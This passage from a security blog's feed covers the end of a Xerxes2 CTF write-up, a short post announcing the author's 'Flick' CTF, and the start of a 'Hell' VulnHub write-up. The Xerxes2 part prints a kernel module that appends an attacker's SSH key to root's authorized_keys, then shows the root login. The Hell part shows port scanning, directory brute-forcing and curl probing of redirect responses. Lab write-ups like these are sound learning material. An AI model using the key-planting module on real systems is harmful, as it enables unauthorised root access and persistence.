    char * envp[] = { &amp;quot;HOME=/&amp;quot;, NULL };
    char *argv[] = { &amp;quot;/bin/bash&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;/bin/cat /tmp/pubkey &amp;gt;&amp;gt; /root/.ssh/authorized_keys&amp;quot;, NULL};
    printk(KERN_INFO &amp;quot;Call Usermodehelper...\n&amp;quot;);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO &amp;quot;Done usermodehelper...\n&amp;quot;);
    return 0;
}

static int __init hello_start(void)
{
    printk(KERN_INFO &amp;quot;Loading rooted module...\n&amp;quot;);
    return get_root();
    return 0;
}

static void __exit hello_end(void)
{
    printk(KERN_INFO &amp;quot;Goodbye Mr.\n&amp;quot;);
}

module_init(hello_start);
module_exit(hello_end);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As can be seen in the code above, I added a function &lt;code&gt;get_root()&lt;/code&gt;, that will append whatever is in &lt;code&gt;/tmp/pubkey&lt;/code&gt; to &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; using &lt;code&gt;call_usermodehelper&lt;/code&gt;. &lt;code&gt;/tmp/pubkey&lt;/code&gt; contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified &lt;code&gt;Makefile&lt;/code&gt; to have &lt;code&gt;obj-m += rooted.o&lt;/code&gt; this time, &lt;code&gt;make&lt;/code&gt;&amp;rsquo;d the source and ran the &lt;code&gt;insmod&lt;/code&gt; for the newly build &lt;code&gt;rooted.ko&lt;/code&gt;. Then, I inspected the kernel messages again, and attempted to login as root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;korenchkin@xerxes2:~/kern$ vi rooted.c

korenchkin@xerxes2:~/kern$ vi Makefile

korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;
  CC [M]  /home/korenchkin/kern/rooted.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/rooted.mod.o
  LD [M]  /home/korenchkin/kern/rooted.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;

korenchkin@xerxes2:~/kern$ echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&amp;quot; &amp;gt; /tmp/pubkey

korenchkin@xerxes2:~/kern$ sudo insmod rooted.ko

korenchkin@xerxes2:~/kern$ dmesg | tail
[   14.512040] eth0: no IPv6 routers present
[  290.023022] Clocksource tsc unstable (delta = 4686567555 ns)
[  290.025022] Switching to clocksource acpi_pm
[57198.109946] bf[25367]: segfault at 40062000 ip 40062000 sp bfc6282c error 14
[68192.983366] hello: module license &#39;unspecified&#39; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module...
[74155.086393] Loading rooted module...
[74155.086397] Call Usermodehelper...
[74155.086449] Done usermodehelper...

korenchkin@xerxes2:~/kern$ logout
Connection to 192.168.56.102 closed.

root@kali:~/Desktop/xeres2# ssh root@192.168.56.102 -i delacroix

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)

root@xerxes2:~# cat /root/flag.txt
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

    congratulations on beating xerxes2!

    I hope you enjoyed it as much as I did making xerxes2.
    xerxes1 has been described as &#39;weird&#39; and &#39;left-field&#39;
    and I hope that this one fits that description too :)

    Many thanks to @TheColonial &amp;amp; @rasta_mouse for testing!

    Ping me on #vulnhub for thoughts and comments!

                      @barrebas, July 2014
root@xerxes2:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; for another great learning opportunity.&lt;/p&gt;

&lt;p&gt;Now, the next step? OSCP :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>flick can you find the flag?</title>
      <link>https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/</link>
      <pubDate>Thu, 07 Aug 2014 12:17:53 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/flick_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h3&gt;

&lt;p&gt;I made a CTF! You should try it! Find it &lt;a href=&#34;http://vulnhub.com/entry/flick-1,99/&#34;&gt;on Vulnhub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;So, security CTF&amp;rsquo;s are fun. A lot of fun. And can be one heck of a time sink! Checking my laptops time and realizing its 3am on a week night is normal when I get pulled into one. The frustration, the trolls, the tremendous amounts of learning is all part of the experience of a successful CTF in my opinion.&lt;/p&gt;

&lt;h2 id=&#34;preparation&#34;&gt;preparation&lt;/h2&gt;

&lt;p&gt;Having done a few now with varying degrees of success has inspired me to attempt to do the same. So, off I went to CTF island and came back a weekend later with &amp;ldquo;Flick&amp;rdquo;. There is no real meaning to &amp;ldquo;Flick&amp;rdquo;. In fact, the name is the result of: &amp;ldquo;What can I call it?&amp;rdquo; &amp;lt; insert 5u seconds &amp;gt; &amp;ldquo;Flick?&amp;rdquo;.&lt;/p&gt;

&lt;h2 id=&#34;details&#34;&gt;details&lt;/h2&gt;

&lt;p&gt;&amp;ldquo;Flick&amp;rdquo; aims to give you chance to learn something new. While some things may be trivial for the seasoned penetration tester by day, there may also be one or two things to learn.&lt;/p&gt;

&lt;p&gt;As far as hints go, there is not much to give in the beginning. You have to &lt;em&gt;find&lt;/em&gt; the flag.txt. It is possible to read it without having root command execution, however, as a added challenge, can you get root command execution? :)&lt;/p&gt;

&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;

&lt;p&gt;I look forward to hearing your experiences with it and good luck! You can find me in #vulnhub on freenode or on twitter @leonjza&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hell would just not freeze over!</title>
      <link>https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/</link>
      <pubDate>Sun, 20 Jul 2014 19:00:46 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/</guid>
      <description>

&lt;p&gt;##foreword
Lets start by saying that this is probably one of the toughest boot2root&amp;rsquo;s I have tried thus far. Even though I have managed to get &lt;code&gt;/root/flag.txt&lt;/code&gt;, I am yet to actually &lt;em&gt;root&lt;/em&gt; this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a &lt;strong&gt;TON&lt;/strong&gt; of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get &lt;strong&gt;root&lt;/strong&gt;, I&amp;rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)&lt;/p&gt;

&lt;h2 id=&#34;welcome-to-hell&#34;&gt;welcome to hell&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://vulnhub.com/entry/hell-1,95/&#34;&gt;Hell&lt;/a&gt; is another vulnerable VM hosted at &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;. After recently completing the &lt;a href=&#34;https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/&#34;&gt;SkyTower&lt;/a&gt; Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging&amp;hellip; The wife was away on a &lt;em&gt;girls weekend out&lt;/em&gt;, so I had plenty of time to sit and really think about things without distractions.&lt;/p&gt;

&lt;h2 id=&#34;the-usual-first-steps&#34;&gt;the usual first steps&lt;/h2&gt;

&lt;p&gt;So, like most other CTF type VM&amp;rsquo;s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap --reason 192.168.56.102

Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-20 19:15 SAST
Nmap scan report for 192.168.56.102
Host is up, received reset (0.00025s latency).
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
111/tcp open  rpcbind syn-ack
666/tcp open  doom    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first &lt;em&gt;whaaat&lt;/em&gt; moment, tcp/666.&lt;/p&gt;

&lt;h2 id=&#34;poking-around&#34;&gt;poking around&lt;/h2&gt;

&lt;p&gt;The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# telnet 192.168.56.102 666
Trying 192.168.56.102...
Connected to 192.168.56.102.
Escape character is &#39;^]&#39;.

Welcome to the Admin Panel
Archiving latest version on webserver (echoserver.bak)...
Starting echo server and monitoring...
ping
ping
pong
pong
^]quit

telnet&amp;gt; quit
Connection closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The line &lt;em&gt;&amp;lsquo;Archiving latest version on webserver (echoserver.bak)&amp;hellip;&amp;rsquo;&lt;/em&gt; hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.&lt;/p&gt;

&lt;h2 id=&#34;the-echo-server&#34;&gt;the echo server&lt;/h2&gt;

&lt;p&gt;From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to &lt;code&gt;echoserver.bak&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl  &amp;quot;http://192.168.56.102/echoserver.bak&amp;quot; &amp;gt; echoserver.bak
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7846  100  7846    0     0  1290k      0 --:--:-- --:--:-- --:--:-- 1532k
root@kali:~# file echoserver.bak
echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation &amp;amp; analysis.
To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I&amp;rsquo;d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a &lt;code&gt;strace&lt;/code&gt;, one will notice the server &amp;lsquo;dying&amp;rsquo; when a socket is closed:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bind(3, {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr(&amp;quot;0.0.0.0&amp;quot;)}, 16) = 0
listen(3, 10)                           = 0
accept(3, 0, NULL)                      = 4
read(4, &amp;quot;test\r\n&amp;quot;, 2000)               = 6
write(4, &amp;quot;test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;quot;..., 1500) = 1500
read(4, &amp;quot;&amp;quot;, 2000)                       = 0
write(4, &amp;quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;quot;..., 1500) = 1500
read(4, &amp;quot;&amp;quot;, 2000)                       = 0
write(4, &amp;quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;quot;..., 1500) = -1 EPIPE (Broken pipe)
--- SIGPIPE (Broken pipe) @ 0 (0) ---
+++ killed by SIGPIPE +++
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Eventually I decided to leave the echoserver alone and move on to the web server.&lt;/p&gt;

&lt;h2 id=&#34;the-web-server&#34;&gt;the web server&lt;/h2&gt;

&lt;p&gt;Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the &lt;code&gt;robots.txt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl http://192.168.56.102/robots.txt
User-agent: *
Disallow: /personal/
Disallow: /super_secret_login_path_muhahaha/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The folder &lt;code&gt;personal/&lt;/code&gt; had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. &lt;code&gt;super_secret_login_path_muhahaha&lt;/code&gt; however, presented us with a login portal with a title &lt;strong&gt;Admin&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The login form posted to &lt;code&gt;login.php&lt;/code&gt;, and on failure would 302 to: &lt;code&gt;http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1&lt;/code&gt;. Fuzzing &lt;code&gt;the_user_is_a_failure&lt;/code&gt; simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.&lt;/p&gt;

&lt;p&gt;The next move was to fuzz more directories and maybe some interesting files. I decided on &lt;code&gt;wfuzz&lt;/code&gt; for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt

Total requests: 3036
==================================================================
ID Response   Lines      Word         Chars          Request
==================================================================

00013:  C=200      7 L        11 W       88 Ch    &amp;quot; - 1&amp;quot;
02780:  C=200   5606 L     35201 W    1028165 Ch     &amp;quot; - server&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Adding &lt;code&gt;.php&lt;/code&gt; to the end of my fuzz keyword revealed some more interesting files:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt

Total requests: 3036
==================================================================
ID Response   Lines      Word         Chars          Request
==================================================================

01375:  C=200     17 L        33 W      371 Ch    &amp;quot; - index&amp;quot;
01663:  C=302      0 L         0 W        0 Ch    &amp;quot; - login&amp;quot;
01684:  C=200      5 L        19 W      163 Ch    &amp;quot; - mail&amp;quot;
02009:  C=302     21 L        38 W      566 Ch    &amp;quot; - panel&amp;quot;
02076:  C=302     17 L        35 W      387 Ch    &amp;quot; - personal&amp;quot;
02439:  C=200      7 L        21 W      170 Ch    &amp;quot; - server&amp;quot;
02852:  C=200      2 L         2 W       19 Ch    &amp;quot; - users&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this gives us slightly more to work with. All of the above are relative to &lt;code&gt;super_secret_login_path_muhahaha&lt;/code&gt;.
&lt;code&gt;/1&lt;/code&gt; was a big red &lt;strong&gt;INTRUDER ALERT&lt;/strong&gt; message, and &lt;code&gt;/server&lt;/code&gt; was a gif of a server rack falling over.&lt;/p&gt;

&lt;p&gt;From the .php file side of things, it was slightly more interesting.&lt;/p&gt;

&lt;h2 id=&#34;302-content-anyone&#34;&gt;302 content anyone?&lt;/h2&gt;

&lt;p&gt;I was already aware of &lt;code&gt;index.php&lt;/code&gt; as well as &lt;code&gt;login.php&lt;/code&gt; due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mail.php&lt;/code&gt; was a page showing us that we have received &lt;em&gt;2&lt;/em&gt; emails, and that the &amp;lsquo;firewall&amp;rsquo; is activated. There was also what I think is a spam filtering dog gif ;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;panel.php&lt;/code&gt; simply redirected you back to &lt;code&gt;index.php&lt;/code&gt;. Assuming there is a auth requirement here.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;personal.php&lt;/code&gt; also simply redirected you back to &lt;code&gt;index.php&lt;/code&gt;. Again, assuming a auth requirement.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;server.php&lt;/code&gt; had the gif we saw in &lt;code&gt;/server&lt;/code&gt; with some humorous test with it. Nothing really of interest.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;users.php&lt;/code&gt; just returned the words &lt;em&gt;Jack&lt;/em&gt;. This is the same user mentioned in the shrine page from &lt;code&gt;/personal/&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Due to these auth requirements, I decided to take all of these url&amp;rsquo;s to &lt;code&gt;curl&lt;/code&gt;, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
&amp;lt;HTML&amp;gt;
&amp;lt;FORM name=&amp;quot;login&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;login.php&amp;quot;&amp;gt;
&amp;lt;CENTER&amp;gt;
&amp;lt;H1&amp;gt; Admin &amp;lt;/H1&amp;gt;
&amp;lt;H3&amp;gt;
&amp;lt;STRONG&amp;gt;Username:&amp;lt;/STRONG&amp;gt;
&amp;lt;INPUT name=&amp;quot;username&amp;quot; id=&amp;quot;username&amp;quot; type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot;/&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;STRONG&amp;gt;Password:&amp;lt;/STRONG&amp;gt;
&amp;lt;INPUT name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; type=&amp;quot;password&amp;quot; value=&amp;quot;&amp;quot;/&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;INPUT name=&amp;quot;mysubmit&amp;quot; id=&amp;quot;mysubmit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;Login&amp;quot;/&amp;gt;
&amp;lt;/H3&amp;gt;
&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here I am telling curl to make a &lt;code&gt;GET&lt;/code&gt; request to &lt;a href=&#34;http://192.168.56.102/super_secret_login_path_muhahaha/index.php&#34;&gt;http://192.168.56.102/super_secret_login_path_muhahaha/index.php&lt;/a&gt;, using a cookies file called &lt;code&gt;cookies&lt;/code&gt; when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of &lt;code&gt;302&lt;/code&gt;&amp;rsquo;s, and be verbose with output so that I can see the headers. Requesting &lt;code&gt;index.php&lt;/code&gt; resulted in a cookie jar of:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to &lt;code&gt;personal.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
* About to connect() to 192.168.56.102 port 80 (#0)
*   Trying 192.168.56.102...
* connected
* Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)
&amp;gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
&amp;gt; User-Agent: curl/7.26.0
&amp;gt; Host: 192.168.56.102
&amp;gt; Accept: */*
&amp;gt; Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310
&amp;gt;
* HTTP 1.1 or later with persistent connection, pipelining supported
&amp;lt; HTTP/1.1 302 Found
&amp;lt; Date: Sun, 20 Jul 2014 07:48:17 GMT
&amp;lt; Server: Apache/2.2.22 (Debian)
&amp;lt; X-Powered-By: PHP/5.4.4-14+deb7u11
&amp;lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&amp;lt; Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
&amp;lt; Pragma: no-cache
&amp;lt; Location: index.php
&amp;lt; Vary: Accept-Encoding
&amp;lt; Content-Length: 387
&amp;lt; Content-Type: text/html
&amp;lt;
* Ignoring the response-body     # WAIT A SEC...
* Connection #0 to host 192.168.56.102 left intact
* Issue another request to this URL: &#39;http://192.168.56.102/super_secret_login_path_muhahaha/index.php&#39;
* Re-using existing connection! (#0) with host (nil)
* Connected to (nil) (192.168.56.102) port 80 (#0)
&amp;gt; GET /super_secret_login_path_muhahaha/index.php HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Look at line 25. &lt;em&gt;Ignoring the request-body&lt;/em&gt;. But we got a 302? Ok lets make another request without the &lt;code&gt;-L&lt;/code&gt; flag and check if it reveals anything:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
* About to connect() to 192.168.56.102 port 80 (#0)
*   Trying 192.168.56.102...
* connected
* Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)
&amp;gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
&amp;gt; User-Agent: curl/7.26.0
&amp;gt; Host: 192.168.56.102
&amp;gt; Accept: */*
&amp;gt; Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310
&amp;gt;
* HTTP 1.1 or later with persistent connection, pipelining supported
&amp;lt; HTTP/1.1 302 Found
&amp;lt; Date: Sun, 20 Jul 2014 07:54:07 GMT
&amp;lt; Server: Apache/2.2.22 (Debian)
&amp;lt; X-Powered-By: PHP/5.4.4-14+deb7u11
&amp;lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&amp;lt; Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
&amp;lt; Pragma: no-cache
&amp;lt; Location: index.php
&amp;lt; Vary: Accept-Encoding
&amp;lt; Content-Length: 387
&amp;lt; Content-Type: text/html
&amp;lt;
&amp;lt;HTML&amp;gt;
&amp;lt;FORM name=&amp;quot;login&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;check.php&amp;quot;&amp;gt;
&amp;lt;CENTER&amp;gt;
&amp;lt;H1&amp;gt; Personal Folder Login &amp;lt;/H1&amp;gt;
&amp;lt;H3&amp;gt;
&amp;lt;STRONG&amp;gt;Username:&amp;lt;/STRONG&amp;gt;
&amp;lt;INPUT name=&amp;quot;username&amp;quot; id=&amp;quot;username&amp;quot; type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot;/&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;STRONG&amp;gt;Password:&amp;lt;/STRONG&amp;gt;
&amp;lt;INPUT name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; type=&amp;quot;password&amp;quot; value=&amp;quot;&amp;quot;/&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;BR&amp;gt;
&amp;lt;INPUT name=&amp;quot;mysubmit&amp;quot; id=&amp;quot;mysubmit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;Login&amp;quot;/&amp;gt;
&amp;lt;/H3&amp;gt;
&amp;lt;/HTML&amp;gt;

* Connection #0 to host 192.168.56.102 left intact
* Closing connection #0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well what do you know. We get a 302 and content. This time we have a login form that posts to &lt;code&gt;check.php&lt;/code&gt;. A &lt;code&gt;GET&lt;/code&gt; request to &lt;code&gt;check.php&lt;/code&gt; resulted in a 302, but to &lt;code&gt;personal.php&lt;/code&gt; and not &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;panel.php&lt;/code&gt; had similar behavior. Showing content even though we got a 302. The output for &lt;code&gt;panel.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;HTML&amp;gt;
&amp;lt;CENTRE&amp;gt;
&amp;lt;H2&amp;gt; Folders &amp;lt;/H2&amp;gt;
&amp;lt;TABLE style=&amp;quot;width:700px&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;server.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;mail.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;users.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;personal.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;notes.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Server Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Mail Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Auth Users&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
